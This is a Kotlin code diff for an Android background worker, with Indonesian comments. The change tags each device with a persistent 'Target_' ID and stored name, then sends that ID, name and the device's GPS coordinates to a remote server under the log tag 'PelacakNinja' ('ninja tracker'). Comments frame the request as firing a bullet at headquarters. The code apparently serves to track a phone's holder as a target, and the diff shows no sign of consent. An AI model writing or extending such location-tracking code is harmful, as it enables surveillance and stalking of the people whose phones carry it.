@@ -43,16 +43,42 @@ class LocationWorker(appContext: Context, workerParams: WorkerParameters) : Coro
     private suspend fun kirimKeServer(lat: Double, lon: Double) {
         withContext(Dispatchers.IO) {
             try {
-                val urlServer = "https://mymaps.hanavy.online/api/update?lat=$lat&lon=$lon"
-                val url = URL(urlServer)
+                // Membaca "Brankas Lokal" di HP untuk mencari ID dan Nama
+                val sharedPref = applicationContext.getSharedPreferences("PelacakPrefs", android.content.Context.MODE_PRIVATE)
+
+                // Cek apakah HP ini sudah punya KTP?
+                var targetId = sharedPref.getString("id_target", null)
+                if (targetId == null) {
+                    // Jika belum punya, buatkan ID acak dan simpan permanen
+                    val idAcak = java.util.UUID.randomUUID().toString().substring(0, 4).uppercase()
+                    targetId = "Target_$idAcak"
+                    sharedPref.edit().putString("id_target", targetId).apply()
+                }
+
+                // Ambil nama dari inputan (jika kosong, gunakan ID target tadi)
+                var targetNama = sharedPref.getString("nama_input", "")
+                if (targetNama.isNullOrEmpty()) {
+                    targetNama = targetId
+                }
+
+                // Enkripsi nama agar aman dikirim lewat URL
+                val namaAman = java.net.URLEncoder.encode(targetNama, "UTF-8")
+
+                // Merakit peluru (URL)
+                val urlServer = "https://mymaps.hanavy.online/api/update?id=$targetId&nama=$namaAman&lat=$lat&lon=$lon"
+                val url = java.net.URL(urlServer)
+                
+                // === TARIK PELATUKNYA DI SINI! (Kirim ke Vercel) ===
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "GET"
-                connection.connectTimeout = 5000 
+                connection.connectTimeout = 5000 // Batas waktu tunggu 5 detik
                 
                 val responseCode = connection.responseCode
-                Log.d("PelacakNinja", "Status Pengiriman: $responseCode")
+                Log.d("PelacakNinja", "Status Tembakan ke Markas: $responseCode")
                 
                 connection.disconnect()
+                // ===================================================
+
             } catch (e: Exception) {
                 Log.e("PelacakNinja", "Gagal mengirim ke server: ${e.message}")
             }
